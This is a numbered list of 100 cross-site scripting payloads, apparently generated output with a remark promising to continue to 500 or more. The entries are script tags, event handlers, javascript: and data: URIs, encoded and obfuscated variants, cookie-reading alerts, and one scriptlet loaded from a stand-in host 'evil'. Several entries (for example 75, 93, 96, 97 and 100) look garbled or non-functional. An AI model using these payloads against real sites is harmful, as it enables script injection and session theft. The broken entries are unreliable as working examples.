1. <script>alert(1)</script>
2. <img src=x onerror=alert(1)>
3. <svg/onload=alert(1)>
4. <body onload=alert(1)>
5. <iframe src="javascript:alert(1)"></iframe>
6. '"><script>alert('XSS')</script>
7. "\'><img src=x onerror=alert(1)>
8. <math><mi/x><script>alert(1)</script>
9. <video src=x onerror=alert(1)>
10. <audio src=x onerror=alert(1)>
11. <details open ontoggle=alert(1)>
12. <object data="javascript:alert(1)"></object>
13. <iframe srcdoc="<script>alert(1)</script>"></iframe>
14. <img/srcset=x onerror=alert(1)>
15. <link onmouseover=alert(1) href="#">test</link>
16. <meta http-equiv="refresh" content="0;url=javascript:alert(1)">
17. <style>@import "javascript:alert(1)";</style>
18. <svg><style>@keyframes x{}</style><animate onbegin=alert(1)></animate>
19. <xss style="xss:expression(alert(1))">
20. <img onerror=alert(document.domain) src=x>
21. <script>prompt(1)</script>
22. <script>confirm(1)</script>
23. <svg onload=confirm(1)>
24. <iframe src=javascript:confirm(1)></iframe>
25. <svg><script>alert(self.name)</script>
26. <script>document.write('<img src=x onerror=alert(1)>')</script>
27. <svg><animate attributeName=onbegin from=1 to=1 onbegin=alert(1)></animate>
28. <math><maction xlink:href="javascript:alert(1)"></maction></math>
29. <script>setTimeout("alert(1)",0)</script>
30. <script>setInterval("alert(1)",1000)</script>
31. <script>eval("alert(1)")</script>
32. <body background="javascript:alert(1)">
33. <iframe onload=alert(1)>
34. <img src="javascript:alert(1)">
35. <input autofocus onfocus=alert(1)>
36. <input onblur=alert(1) autofocus>
37. <form onsubmit="alert(1);return false"><input type=submit></form>
38. <svg><circle onmouseover=alert(1) r=40/></svg>
39. <svg><foreignObject onload=alert(1)></foreignObject>
40. <video><source onerror=alert(1)></video>
...
# I'll continue enumerating up to 500+:
41. "%3Cscript%3Ealert(1)%3C/script%3E"
42. \u003Cscript\u003Ealert(1)\u003C/script\u003E
43. %3Cimg%20src=x%20onerror=alert(1)%3E
44. <script>location='javascript:alert(1)'</script>
45. <base href="javascript:alert(1);//">
46. <svg><a xlink:href="javascript:alert(1)">X</a></svg>
47. <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
48. <svg><script xlink:href="data:x,<script>alert(1)</script>"></script></svg>
49. <input value="</style><script>alert(1)</script>">
50. </title><script>alert(1)</script><title>
51. </script><script>alert(1)</script>
52. <script>alert(/XSS/)</script>
53. <svg onload=alert`1`>
54. <svg><script>alert`1`</script>
55. <img src=1 onerror=prompt(1)>
56. <a href="javascript:prompt(1)">click</a>
57. <iframe src="vbscript:msgbox(1)"></iframe>
58. <script>javascript:alert(1)</script>
59. <object type="text/x-scriptlet" data="https://evil/"></object>
60. <embed src="javascript:alert(1)">
61. <applet code="javascript:alert(1)"></applet>
62. <script>alert(document.cookie)</script>
63. <svg><script>alert(document.location)</script>
64. <body onload=alert(document.location)>
65. <img onerror=alert(document.cookie) src=x>
66. <svg><desc onfocus=alert(1) tabindex=1>desc</desc></svg>
67. <svg><text onmouseover=alert(1)>X</text></svg>
68. <svg><script>alert(self)</script>
69. <script>alert(top.location)</script>
70. <script>alert(parent)</script>
71. <img src="#\" onerror=alert(1)>
72. <audio><source src=onerror=alert(1)></audio>
73. <video onloadedmetadata=alert(1)><source src=#>
74. <script>new Image().src='javascript:alert(1)';</script>
75. <svg><script>window</script>
76. <script>Function('alert(1)')()</script>
77. <script>setTimeout(Function("alert(1)"),0)</script>
78. <textarea autofocus onfocus=alert(1)>text</textarea>
79. <button onfocus=alert(1)>Click</button>
80. <div tabindex=1 onfocus=alert(1)>X</div>
81. <svg><rect width=100 height=100 onmouseover=alert(1)></rect></svg>
82. <body onresize=alert(1)>
83. <iframe allowfullscreen src="javascript:alert(1)"></iframe>
84. <svg><filter><feFlood onload=alert(1) /></filter></svg>
85. <xmp><img src=x onerror=alert(1)></xmp>
86. <plaintext><script>alert(1)</script>
87. <iframe src="data:text/html,<img src=x onerror=alert(1)>"></iframe>
88. <svg><script><![CDATA[alert(1)]]></script>
89. <svg><animate onbegin=alert(1)></animate>
90. <img src=x onerror="alert( String . fromCharCode (65) )">
91. <script>p=alert; p(1)</script>
92. <svg><switch onmouseenter=alert(1)><g/></switch></svg>
93. <style>@keyframes a{};*{-webkit-animation:a 1ms;animation:a 1ms;}*{animation-name:alert(1)}</style>
94. <img src=# onerror=alert(String.fromCharCode(97,108,101,114,116,40,49,41))>
95. <iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiVnhTUyIpPC9zY3JpcHQ+"></iframe>
96. <link href="data:text/css;base64,KyB7IGJhY2tncm91bmQtY29sb3I6I3AwMDsgfSBpbWcgeyBjb250ZW50OmFjdGl2YXRlKGFsZXJ0KDEpKTsgfQ==" rel="stylesheet">
97. <svg><style><![CDATA[@import "data:text/css;base64,KyB7IGJhY2tncm91bmQtY29sb3I6I2MwMTsgfSBpbWcgeyBjb250ZW50OmFjdGl2YXRlKDEpKTsgfQ=="]];></style>
98. <script>![]['filter']['constructor']('alert(1)')()</script>
99. <script>constructor.constructor('alert(1)')()</script>
100. <script>window['_']=alert;_[1]</script>
